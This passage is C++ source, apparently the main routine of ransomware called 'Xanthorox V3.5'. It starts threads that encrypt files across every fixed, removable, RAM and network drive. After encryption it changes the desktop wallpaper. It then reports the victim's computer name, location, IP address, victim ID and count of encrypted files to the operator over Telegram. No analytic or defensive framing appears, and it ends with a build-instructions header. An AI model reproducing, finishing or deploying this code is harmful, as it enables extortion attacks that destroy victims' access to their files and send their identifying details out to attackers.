    // --- Start Threads ---
    LogToFile(L"Starting worker threads (" + std::to_wstring(NUM_WORKER_THREADS) + L")..."); active_threads = 0; std::vector<std::thread> worker_threads; worker_threads.reserve(NUM_WORKER_THREADS); for (int i = 0; i < NUM_WORKER_THREADS; ++i) { try { worker_threads.emplace_back(EncryptFileWorker); } catch (...) { LogToFile(L"Failed to create worker thread " + std::to_wstring(i));} } for(auto& t : worker_threads) { if (t.joinable()) t.detach(); } worker_threads.clear(); LogToFile(L"Worker threads dispatched.");
    LogToFile(L"Starting directory traversal..."); wchar_t driveStrings[MAX_PATH] = {0}; traversal_threads_active = 0; std::vector<std::thread> traversal_dispatch_threads;
    if (GetLogicalDriveStringsW(MAX_PATH - 1, driveStrings)) { wchar_t* drive = driveStrings; while (*drive) { try { std::filesystem::path drivePath(drive); UINT driveType = GetDriveTypeW(drivePath.c_str()); if (driveType == DRIVE_FIXED || driveType == DRIVE_RAMDISK || driveType == DRIVE_REMOVABLE || driveType == DRIVE_REMOTE) { LogToFile(L"Dispatching traversal thread for drive: " + drivePath.wstring() + L" (Type: " + std::to_wstring(driveType) + L")"); traversal_threads_active++; traversal_dispatch_threads.emplace_back(TraverseAndEncrypt, drivePath, std::ref(traversal_threads_active)); } else { LogToFile(L"Skipping drive: " + drivePath.wstring() + L" (Type: " + std::to_wstring(driveType) + L")"); } } catch (...) { LogToFile(L"Error processing drive letter: " + std::wstring(drive)); } drive += wcslen(drive) + 1; } for(auto& t : traversal_dispatch_threads) { if(t.joinable()) t.detach(); } traversal_dispatch_threads.clear(); } else { LogToFile(L"GetLogicalDriveStrings Failed." + GetLastErrorStdWstr(GetLastError())); } LogToFile(L"Traversal dispatch finished. Initial active traversals: " + std::to_wstring(traversal_threads_active.load()));

    // --- Wait Loop 1: Traversal ---
    LogToFile(L"Waiting for directory traversals to complete..."); while (traversal_threads_active.load(std::memory_order_acquire) > 0) { std::this_thread::sleep_for(std::chrono::seconds(1)); } LogToFile(L"Directory traversals complete. Signaling workers queue is finished.");
    work_done.store(true, std::memory_order_release);

    // --- Wait Loop 2: Workers ---
    LogToFile(L"Waiting for worker threads to finish processing queue..."); int checks = 0; const int max_idle_checks = 180;
    while (active_threads.load(std::memory_order_acquire) > 0) { if (checks % 15 == 0) { LogToFile(L"Waiting for workers... Active: " + std::to_wstring(active_threads.load()) + L", Queue Approx Size: " + std::to_wstring(file_queue.size())); } std::this_thread::sleep_for(std::chrono::seconds(1)); checks++; if(checks > max_idle_checks * 2) { LogToFile(L"WARNING: Exiting worker wait loop due to potential hang (long wait)."); break; } }
    LogToFile(L"Workers appear finished.");

    // --- Final Actions (Wallpaper Change MOVED HERE) ---
    LogToFile(L"Changing Wallpaper NOW...");
    ChangeWallpaper(); // Change wallpaper AFTER workers finish

    uint64_t final_count = files_encrypted_count.load();
    LogToFile(L"Total files encrypted (counter): " + std::to_wstring(final_count));
    std::stringstream ss_telegram;
    ss_telegram << "--- XANTHOROX V3 HIT ---" << "\n";
    ss_telegram << "Computer = " << WStringToString(computerName) << "\n";
    ss_telegram << "Location = " << country << "\n";
    ss_telegram << "IP Address = " << ip_address << "\n";
    ss_telegram << "Victim ID = " << WStringToString(victimId) << "\n";
    ss_telegram << "Files Encrypted = " << final_count;
    std::string notification_message_final = ss_telegram.str();

    LogToFile(L"Sending final Telegram Notification...");
    SendTelegramNotification(notification_message_final);
    LogToFile(L"Waiting briefly for Telegram thread...");
    Sleep(4000); // Wait 4 seconds
    // ------------------------------------------------------

    LogToFile(L"Cleaning up crypto..."); CleanupCrypto();
    if (hMutex) { LogToFile(L"Releasing mutex."); ReleaseMutex(hMutex); CloseHandle(hMutex); }
    LogToFile(L"===== Xanthorox V3.5 SPEED End =====");
    ExitProcess(0);
}

// =====================================================================================
// Build Instructions & Warnings
// =====================================================================================
/* (Keep comments as before) */